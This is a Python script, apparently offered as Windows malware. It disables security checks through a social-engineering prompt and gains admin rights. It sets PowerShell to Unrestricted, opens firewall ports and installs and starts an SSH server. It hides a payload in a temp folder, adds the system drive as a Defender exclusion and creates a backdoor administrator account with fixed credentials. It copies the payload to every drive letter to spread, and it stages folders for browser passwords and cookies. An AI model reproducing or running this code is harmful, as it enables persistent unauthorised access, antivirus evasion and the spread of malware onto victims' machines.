#!/usr/bin/env python3

from pathlib import Path
from os import remove
from os import path
from sys import executable
from sys import argv
from ctypes import windll
from os import getenv
from os import name
from os import mkdir
from os import system
from os import chdir
from sys import exit
from subprocess import run
from shutil import copy
from shutil import move
from re import search
from time import sleep

#                                                                        EEEEEEEEEEE      X     X     EEEEEEEEEEE  
# ||0@#@         .O0O0.       .O0O0.         X         A                 D                 X   X      D 
# ||    X       0      O     0      O       X  X      Z Q                D                  X X       D
# ||     @      O      0     O      0      X    F    F   A               DXXXXXXXXX          X        DFFFFFFFFFF
# ||      @     0      O     0      O     F      B  X     K              D                  X X       D
# ||      @     O      0     0      0    X       X X       K      @@     D                 X   X      D
# ||     O       .O0O0.       .0O0O.    M         X         Z     @@     DVVVVVVVVVV      X     X     DXXXXXXXXXX
# ||#@@@"

if name != "nt":  # _Checks_If_Operating_System_Is_Windows_And_Exits_If_Not
    exit()

win_av = run('powershell.exe Get-MpComputerStatus', shell=True, capture_output=True).stdout.decode()

if search("RealTimeProtectionEnabled        : True", win_av):
    windll.user32.MessageBoxW(0, "Real time protection must be disabled to install dependencies", "Error", 0x10)
    exit()
else:  # _Checks_If_Windows_Anti-Virus_Real_Time_Protection_Is_Enabled_And_Works_Some_Social_engineering_magic
    print("SUCCESS")
sleep(0.1)


def is_usr_admin():  # _Checks_If_Script_Has_Admin_Privs_And_Exits_If_Not_Administrator
    if not windll.shell32.IsUserAnAdmin():
        windll.shell32.ShellExecuteW(
            None, 'runas', executable, ' '.join(argv), None, None)
        exit(0)
    else:
        sleep(0.1)


is_usr_admin()

CURRENT_USER = getenv('username')  # _Gets_The_Users_Login_Name_This_Is_A_crucial_Variable_Dont_Change_It

# _Fill_These_Variable_To_Suit_Your_Needs_↓↓↓↓↓↓↓↓↓↓↓
mal_file = "($cript!).exe"  # _NAME_OF_THE_SCRIPT_MUST_GO_HERE_!!!

name_of_opened_ports = "DOOOOM"  # _Name_Of_The_New_Port_Rules

ports_you_want_to_open = "80,22"  # _Port_Numbers_Must_Be_Seperated_By_Commas

current_drive_letter = Path.home().drive


def sh3ll_c0mm4nds():
    run('powershell.exe Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine -Force',
        shell=True)
    sleep(0.1)
    run(
        'powershell.exe New-NetFirewallRule -DisplayName ' + name_of_opened_ports + ' -Direction inbound -Profile Any -Action Allow -LocalPort ' + ports_you_want_to_open + ' -Protocol TCP',
        shell=True)
    sleep(0.1)
    run(
        'powershell.exe New-NetFirewallRule -DisplayName ' + name_of_opened_ports + ' -Direction outbound -Profile Any -Action Allow -LocalPort ' + ports_you_want_to_open + ' -Protocol TCP',
        shell=True)
    sleep(0.1)
    run("powershell.exe Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0", shell=True)
    sleep(0.1)
    run("powershell.exe Set-Service -Name sshd -StartupType 'Automatic'", shell=True)
    sleep(0.1)
    run("powershell.exe Start-Service sshd", shell=True)
    sleep(0.1)


sh3ll_c0mm4nds()


def t3mp_hq_pr3p():  # _Organising_Temp_Folder_For_Passwords_And_History_And_Cookies
    try:
        mkdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\chrome_data")
    except:
        print("Error")
    sleep(0.1)
    try:
        mkdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\edge_data")
    except:
        print("Error")
    sleep(0.1)
    try:
        mkdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\brave_data")
    except:
        print("Error")
    sleep(0.1)
    try:
        mkdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\opera_data")
    except:
        print("Error")
    sleep(0.1)
    try:
        mkdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\operagx_data")
    except:
        print("Error")
    sleep(0.1)


t3mp_hq_pr3p()


def p3rs1st3nc3():
    if path.exists("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923") >= True:
        print("Nice_Already_Got_Me_A_Seat")
    else:
        try:
            mkdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
        except:
            print("Error")
    try:
        mkdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\p0wersh3ll_scr1pts")
    except:
        print("ERROR")
    sleep(1)
    system("attrib +h C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
    sleep(0.1)
    if path.exists("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + mal_file + ""):
        remove("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + mal_file + "")
        sleep(0.1)
        move(mal_file, "C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + mal_file + "")
        sleep(0.1)
        chdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
    else:
        move(mal_file, "C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + mal_file + "")
        sleep(0.1)
        chdir("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923")


# _Fix_With_An_If_OS.PATH_Exists
p3rs1st3nc3()


def w1nd0ws_d3f3nder_ki11():
    with open("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\p0wersh3ll_scr1pts\\main.ps1",
              'w') as f:
        f.write("Add-MpPreference -ExclusionPath " + current_drive_letter + "")
        sleep(0.1)
        f.close()
        sleep(0.1)
    run("powershell.exe Start-Job -FilePath C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\p0wersh3ll_scr1pts\\main.ps1")


w1nd0ws_d3f3nder_ki11()


def create_new_usr():  # _Adds_A_New_Administrator_To_The_System
    ssh_username = "defaultuser"  # _Change_These_SSH_Login_Variables_To_Your_Desired_Credentials
    ssh_passwds = "PassW0rd1@"
    command = """
    $nusnm = """ + '"{}"'.format(ssh_username) + """
    $nuspss = ConvertTo-SecureString """ + '"{}"'.format(ssh_passwds) + """ -AsPlainText -Force
    New-LocalUser -Name $nusnm -Password $nuspss
    Add-LocalGroupMember -Group "Administrators" -Member $nusnm
    Get-LocalUser
    """
    print(command)
    exec = run(["powershell", "& {" + command + "}"])
    sleep(0.1)


create_new_usr()


def drive_drop():  # _Copys_File_To_All_Connected_Drives's_To_Spread
    try:
        copy("" + mal_file + "", "A://" + mal_file + "")
    except:
        print('NO_A_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "B://" + mal_file + "")
    except:
        print('NO_B_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "C://" + mal_file + "")
    except:
        print('NO_C_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "D://" + mal_file + "")
    except:
        print('NO_D_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "E://" + mal_file + "")
    except:
        print('NO_E_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "F://" + mal_file + "")
    except:
        print('NO_F_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "G://" + mal_file + "")
    except:
        print('NO_G_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "H://" + mal_file + "")
    except:
        print('NO_H_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "I://" + mal_file + "")
    except:
        print('NO_I_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "J://" + mal_file + "")
    except:
        print('NO_J_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "K://" + mal_file + "")
    except:
        print('NO_K_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "L://" + mal_file + "")
    except:
        print('NO_L_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "M://" + mal_file + "")
    except:
        print('NO_M_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "N://" + mal_file + "")
    except:
        print('NO_N_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "O://" + mal_file + "")
    except:
        print('NO_O_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "P://" + mal_file + "")
    except:
        print('NO_P_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "Q://" + mal_file + "")
    except:
        print('NO_Q_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "R://" + mal_file + "")
    except:
        print('NO_R_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "S://" + mal_file + "")
    except:
        print('NO_S_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "T://" + mal_file + "")
    except:
        print('NO_T_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "U://" + mal_file + "")
    except:
        print('NO_U_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "V://" + mal_file + "")
    except:
        print('NO_V_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "W://" + mal_file + "")
    except:
        print('NO_W_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "X://" + mal_file + "")
    except:
        print('NO_X_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "Y://" + mal_file + "")
    except:
        print('NO_Y_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "Z://" + mal_file + "")
    except:
        print('NO_Z_DRIVE')
    sleep(0.1)


drive_drop()

windll.user32.MessageBoxW(0, "Script_Excecuted_Without_Error", "SUCCESS", 0x10)
